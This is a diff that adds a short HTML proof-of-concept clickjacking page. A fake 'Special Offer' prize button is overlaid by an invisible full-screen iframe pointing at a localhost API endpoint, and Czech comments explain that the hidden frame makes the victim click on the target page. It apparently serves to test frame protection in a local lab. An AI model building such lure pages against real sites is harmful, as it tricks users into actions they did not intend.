@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking Attack</title>
+    <style>
+        /* Skrytí iframe přesně tak, aby oběť klikla na správné místo */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+    <h1>Special Offer!</h1>
+    <p>Click on the button below to claim your prize!</p>
+    <button>Claim Prize</button>
+
+    <!-- Skrytý iframe, který vykoná akci na stránce oběti -->
+    <iframe src="http://localhost:8080/api/users/test" frameborder="0"></iframe>
+</body>
+</html>
